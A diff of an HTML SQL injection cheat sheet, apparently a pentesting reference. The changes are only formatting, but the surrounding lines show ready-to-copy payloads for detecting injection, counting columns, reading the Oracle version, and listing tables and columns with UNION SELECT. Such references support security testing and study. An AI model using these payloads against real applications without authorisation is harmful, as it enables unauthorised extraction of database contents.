@@ -44,6 +44,7 @@ Getting errors can represent the presence of the vulnerability. <b>[HTTP/2 500 I
 <b>C6: </b><mark id="HDT006">'#</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT001')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT002')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT003')">.C3.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT004')">.C4.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT005')">.C5.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT006')">.C6.</button>
+
 <b>NOTE:</b> It is needed to check the behavior of the application GUI and headers [<b>burpsuite</b>].	
 
 </details>
@@ -78,6 +79,7 @@ If the vulnerability is present the goal is to "close" the query and retrieve al
 <b>--</b> or <b>#</b> | Are used in SQL query language to comment ignoring the rest of the query. <br>
 	
 <b>::: PRE-REQS:</b>
+	
 <u>1. GET COLUMN NUMBER</u>
 
 <b>C1: METHOD </b><mark id="DTT01">' ORDER BY 1--</mark>
@@ -91,8 +93,8 @@ If the vulnerability is present the goal is to "close" the query and retrieve al
 <b>C3: ORACLE TEST </b><mark id="DTT05">' UNION SELECT 'a','a' FROM DUAL--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT03')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT04')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT05')">.C3.</button>
 <br>
-<b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns is needed. 
-Also, for ORACLE the select statement <u>is needed a table to search from</u>, it can be any table.
+<b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns is needed. Also, for ORACLE 
+the select statement <u>is needed a table to search from</u>, it can be any table.
 	
 <b>COMMON TESTS:</b>
 
@@ -100,6 +102,7 @@ Also, for ORACLE the select statement <u>is needed a table to search from</u>, i
 
 <b>C1: </b><mark id="DTT06">' UNION SELECT 'a','a' FROM DUAL--</mark>
 <b>C2: </b><mark id="DTT07">' UNION SELECT banner,NULL FROM v$version--</mark>
+
 *assuming it has two columns and both are type string.
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT07')">.C2.</button>
@@ -116,14 +119,16 @@ Also, for ORACLE the select statement <u>is needed a table to search from</u>, i
 
 <b>SAMPLE: </b><mark id="">' UNION SELECT ()version,NULL#</mark>
 
-<b>SAMPLE: </b><mark id="">' and substring((version()),1,1) = '0'#</mark></p>
+<b>SAMPLE: </b><mark id="">' and substring((version()),1,1) = '0'#</mark>
 </details>
 <details>
 <summary>LISTING DATABASE CONTENT TECHNIQUES</summary>
 <b>DESCRIPTION:</b> Used to retrieve the name of table, columns, etc. to retrieve content from database. 
+
 <details>
 <summary>NON-ORACLE</summary>
 <b>PRE-REQS:</b>
+	
 1. get column number
 2. get field type
 
@@ -140,10 +145,12 @@ Also, for ORACLE the select statement <u>is needed a table to search from</u>, i
 <b>C3: </b><mark id="LDCT03">' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT03')">.C3.</button>
+
 </details>
 <details>
 <summary>ORACLE</summary>
 <b>::: PRE-REQS:</b>
+	
 1. get column number
 2. get field type
 
@@ -159,7 +166,8 @@ Also, for ORACLE the select statement <u>is needed a table to search from</u>, i
 
 <b>C3: </b><mark id="LDCT06">' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT04')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT05')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT06')">.C3.</button></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT04')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT05')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT06')">.C3.</button>
+
 </details>
 <b>NOTE:</b> Both ways needs to know the column number, field type and both examples are assuming it has two 
 columns and both type string.
